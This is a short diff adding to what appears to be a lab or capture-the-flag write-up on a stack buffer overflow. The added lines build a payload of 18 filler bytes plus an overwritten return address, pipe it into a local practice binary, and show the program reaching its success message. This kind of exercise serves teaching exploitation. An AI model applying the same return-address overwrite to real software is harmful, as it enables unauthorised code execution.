@@ -10,3 +10,11 @@ setting the breakpoint at the vulnerable function and running
 indicates there are 18 bytes difference between the return address of the vulnerable function. 
 
 Hence, 
+
+printf 'AAAAAAAAAAAAAAAAAA\xbb\x11\x40\x00\x00\x00\x00\x00' > p.txt
+
+cat p.txt |./sof
+Enter some text: You entered: AAAAAAAAAAAAAAAAAA�@
+Yes! You did it!
+
+
